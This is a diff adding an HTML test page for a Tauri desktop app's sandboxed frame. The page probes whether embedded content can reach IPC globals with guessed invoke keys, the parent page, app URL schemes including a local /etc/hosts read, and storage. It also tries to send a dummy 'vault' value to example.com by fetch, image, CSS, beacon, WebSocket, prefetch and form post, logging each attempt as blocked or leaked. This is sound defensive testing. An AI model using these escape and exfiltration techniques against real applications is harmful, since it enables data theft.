@@ -1,0 +1,224 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>synvisual spike</title>
+<style>
+  body { font: 13px/1.5 system-ui, sans-serif; margin: 12px; color: #444; }
+  #bg { width: 1px; height: 1px; }
+</style>
+</head>
+<body>
+<p>Bước 0 — trang tấn công. Mỗi phép thử phải bị chặn.</p>
+<div id="bg"></div>
+<script>
+(() => {
+  const results = [];
+  const violations = [];
+  document.addEventListener('securitypolicyviolation', (e) => {
+    violations.push(`${e.effectiveDirective || e.violatedDirective} ${e.blockedURI}`);
+  });
+
+  const add = (group, name, outcome, detail = '') => results.push({ group, name, outcome, detail: String(detail).slice(0, 200) });
+  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
+  const settle = (promise, ms = 2500) =>
+    Promise.race([
+      promise.then((v) => ({ state: 'resolved', value: v }), (e) => ({ state: 'rejected', value: e })),
+      wait(ms).then(() => ({ state: 'timeout' })),
+    ]);
+  const violatedSince = (count, needle) => violations.slice(count).some((v) => v.includes(needle));
+
+  // An IPC message shaped like Tauri's own, aimed at the command that counts
+  // arrivals. The key is a guess: the real one lives in the main frame only.
+  const ipcBody = (key) => JSON.stringify({
+    cmd: 'visual_spike_ping', callback: 1, error: 2, payload: {}, options: {}, __TAURI_INVOKE_KEY__: key,
+  });
+
+  async function run() {
+    // Positive controls: if these are missing, the frame itself is broken and
+    // nothing below means anything.
+    add('control', 'inline script runs', 'ok');
+    add('control', 'location.origin', 'info', location.origin);
+    add('control', 'location.href', 'info', location.href);
+    add('control', 'user agent', 'info', navigator.userAgent);
+
+    // 1. Tauri's globals.
+    for (const name of ['__TAURI_INTERNALS__', '__TAURI__', '__TAURI_INVOKE_KEY__', '__TAURI_IPC__', '__TAURI_PATTERN__']) {
+      add('ipc', `window.${name}`, typeof window[name] === 'undefined' ? 'blocked' : 'LEAKED', typeof window[name]);
+    }
+
+    // 2. The native message channels. Reaching one is not yet a breach — the
+    // invoke key decides — so these say "reachable" and the ping count decides.
+    const channels = [
+      ['window.ipc.postMessage', () => window.ipc && window.ipc.postMessage],
+      ['webkit.messageHandlers.ipc', () => window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.ipc],
+      ['chrome.webview.postMessage', () => window.chrome && window.chrome.webview && window.chrome.webview.postMessage],
+    ];
+    for (const [name, find] of channels) {
+      let channel;
+      try { channel = find(); } catch (e) { add('ipc', name, 'blocked', e); continue; }
+      if (!channel) { add('ipc', name, 'blocked', 'absent'); continue; }
+      try {
+        for (const key of ['guess', '']) {
+          if (name === 'webkit.messageHandlers.ipc') window.webkit.messageHandlers.ipc.postMessage(ipcBody(key));
+          else if (name === 'chrome.webview.postMessage') window.chrome.webview.postMessage(ipcBody(key));
+          else window.ipc.postMessage(ipcBody(key));
+        }
+        add('ipc', name, 'reachable', 'sent with a guessed key; see the ping count');
+      } catch (e) {
+        add('ipc', name, 'blocked', e);
+      }
+    }
+
+    // 3. IPC over the custom protocol, both spellings.
+    for (const url of ['ipc://localhost/visual_spike_ping', 'http://ipc.localhost/visual_spike_ping']) {
+      const before = violations.length;
+      const r = await settle(fetch(url, {
+        method: 'POST',
+        body: '{}',
+        headers: { 'Content-Type': 'application/json', 'Tauri-Callback': '1', 'Tauri-Error': '2', 'Tauri-Invoke-Key': 'guess' },
+      }));
+      if (r.state === 'rejected') add('ipc', `fetch ${url}`, 'blocked', violatedSince(before, 'connect') ? 'CSP connect-src' : r.value);
+      else add('ipc', `fetch ${url}`, 'LEAKED', r.state === 'timeout' ? 'request left the frame (no answer)' : `status ${r.value.status}`);
+    }
+
+    // 4. The page around the frame.
+    try { void parent.document.title; add('parent', 'parent.document', 'LEAKED'); }
+    catch (e) { add('parent', 'parent.document', 'blocked', e.name); }
+    try { void top.location.href; add('parent', 'read top.location.href', 'LEAKED', top.location.href); }
+    catch (e) { add('parent', 'read top.location.href', 'blocked', e.name); }
+    try { void parent.localStorage; add('parent', 'parent.localStorage', 'LEAKED'); }
+    catch (e) { add('parent', 'parent.localStorage', 'blocked', e.name); }
+    try {
+      const w = window.open('https://example.com/');
+      add('parent', 'window.open', w ? 'LEAKED' : 'blocked', w ? 'a window opened' : 'returned null');
+    } catch (e) { add('parent', 'window.open', 'blocked', e.name); }
+
+    // 5. Carrying data out.
+    {
+      const before = violations.length;
+      const r = await settle(fetch('https://example.com/?d=vault'));
+      add('exfil', 'fetch https', r.state === 'rejected' ? 'blocked' : 'LEAKED', violatedSince(before, 'example.com') ? 'CSP' : r.state);
+    }
+    {
+      const before = violations.length;
+      const outcome = await new Promise((resolve) => {
+        const img = new Image();
+        img.onload = () => resolve('LEAKED');
+        img.onerror = () => resolve(violatedSince(before, 'example.com') ? 'blocked' : 'unclear');
+        img.src = 'https://example.com/favicon.ico?d=vault';
+        setTimeout(() => resolve(violatedSince(before, 'example.com') ? 'blocked' : 'unclear'), 2500);
+      });
+      add('exfil', 'img https', outcome, outcome === 'unclear' ? 'failed without a CSP report — network?' : '');
+    }
+    {
+      const before = violations.length;
+      document.getElementById('bg').style.backgroundImage = 'url(https://example.com/bg.png?d=vault)';
+      void getComputedStyle(document.getElementById('bg')).backgroundImage;
+      await wait(1500);
+      add('exfil', 'CSS url()', violatedSince(before, 'example.com') ? 'blocked' : 'unclear', 'judged by a CSP report');
+    }
+    {
+      const before = violations.length;
+      let queued;
+      try { queued = navigator.sendBeacon('https://example.com/b', 'vault'); } catch (e) { queued = false; }
+      await wait(500);
+      add('exfil', 'sendBeacon', queued && !violatedSince(before, 'example.com') ? 'LEAKED' : 'blocked', `returned ${queued}`);
+    }
+    {
+      const before = violations.length;
+      const outcome = await new Promise((resolve) => {
+        try {
+          const ws = new WebSocket('wss://example.com/');
+          ws.onopen = () => resolve('LEAKED');
+          ws.onerror = () => resolve(violatedSince(before, 'example.com') ? 'blocked' : 'unclear');
+          setTimeout(() => resolve(violatedSince(before, 'example.com') ? 'blocked' : 'unclear'), 2500);
+        } catch (e) { resolve('blocked'); }
+      });
+      add('exfil', 'WebSocket', outcome);
+    }
+    {
+      const before = violations.length;
+      const link = document.createElement('link');
+      link.rel = 'prefetch';
+      link.href = 'https://example.com/p?d=vault';
+      document.head.appendChild(link);
+      await wait(1500);
+      add('exfil', 'link prefetch', violatedSince(before, 'example.com') ? 'blocked' : 'unclear', 'judged by a CSP report');
+    }
+
+    // 6. The app's own schemes: its pages, its files.
+    for (const url of ['tauri://localhost/', 'http://tauri.localhost/', 'asset://localhost/%2Fetc%2Fhosts', 'http://asset.localhost/%2Fetc%2Fhosts', 'synvisual://localhost/spike/attack', 'http://synvisual.localhost/spike/attack']) {
+      const r = await settle(fetch(url));
+      add('app', `fetch ${url}`, r.state === 'rejected' ? 'blocked' : 'LEAKED', r.state === 'resolved' ? `status ${r.value.status}` : r.state);
+    }
+    {
+      const before = violations.length;
+      const frame = document.createElement('iframe');
+      frame.src = 'tauri://localhost/';
+      document.body.appendChild(frame);
+      await wait(1500);
+      let readable = false;
+      try { readable = !!frame.contentDocument; } catch (e) { readable = false; }
+      add('app', 'nested iframe of the app', readable ? 'LEAKED' : 'blocked', violatedSince(before, 'frame') ? 'CSP frame-src' : 'not readable');
+      frame.remove();
+    }
+
+    // 7. Keeping state between visuals.
+    try { localStorage.setItem('x', '1'); add('state', 'localStorage', 'LEAKED'); }
+    catch (e) { add('state', 'localStorage', 'blocked', e.name); }
+    try { sessionStorage.setItem('x', '1'); add('state', 'sessionStorage', 'LEAKED'); }
+    catch (e) { add('state', 'sessionStorage', 'blocked', e.name); }
+    {
+      const outcome = await new Promise((resolve) => {
+        try {
+          const req = indexedDB.open('spike');
+          req.onsuccess = () => resolve('LEAKED');
+          req.onerror = () => resolve('blocked');
+          setTimeout(() => resolve('blocked'), 1500);
+        } catch (e) { resolve('blocked'); }
+      });
+      add('state', 'indexedDB', outcome);
+    }
+    try {
+      document.cookie = 'spike=1';
+      add('state', 'document.cookie', document.cookie.includes('spike=1') ? 'LEAKED' : 'blocked');
+    } catch (e) { add('state', 'document.cookie', 'blocked', e.name); }
+
+    // 8. What the CSP leaves out on purpose.
+    try { eval('1 + 1'); add('policy', 'eval', 'LEAKED', 'unsafe-eval is not granted'); }
+    catch (e) { add('policy', 'eval', 'blocked', e.name); }
+
+    add('control', 'CSP reports seen', 'info', violations.length);
+  }
+
+  // Navigation last: a form or a top-level navigation that got through would
+  // take this page — or the app — away with it, so the results go first and
+  // each attempt is followed by "still here".
+  const post = (type, extra = {}) => parent.postMessage({ type, ...extra }, '*');
+
+  run()
+    .catch((e) => add('control', 'the page itself', 'error', e && e.stack || e))
+    .then(() => {
+      post('synvisual-spike/result', { results });
+      try {
+        const form = document.createElement('form');
+        form.action = 'https://example.com/f';
+        form.method = 'post';
+        const field = document.createElement('input');
+        field.name = 'd';
+        field.value = 'vault';
+        form.appendChild(field);
+        document.body.appendChild(form);
+        form.submit();
+      } catch (e) { /* a refusal is the result we want */ }
+      setTimeout(() => {
+        post('synvisual-spike/after-form');
+        try { top.location.href = 'about:blank#synvisual-escaped'; post('synvisual-spike/top-nav', { threw: false }); }
+        catch (e) { post('synvisual-spike/top-nav', { threw: true, name: e.name }); }
+      }, 1000);
+    });
+})();
+</script>
+</body>
+</html>
